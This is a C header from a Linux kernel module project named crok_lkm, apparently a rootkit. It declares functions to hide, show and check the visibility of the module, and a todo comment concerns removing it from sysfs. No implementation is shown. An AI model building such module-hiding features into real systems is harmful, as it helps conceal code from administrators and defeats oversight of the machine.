/*
 * crok_lkm
 * Copyright (C) 2023  Chistyakov Alexander
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

#ifndef _CROK_LKM_CTRL_IOCTL_MODULE_H_
#define _CROK_LKM_CTRL_IOCTL_MODULE_H_

/*
 * @todo    Implement restore and remove the LKM from sysfs.
 *          https://stackoverflow.com/questions/46502395/restore-or-remove-the-linux-kernel-module-from-sysfs
 */

int is_module_hidden(void);

void module_hide(void);

void module_show(void);

#endif /* _CROK_LKM_CTRL_IOCTL_MODULE_H_ */

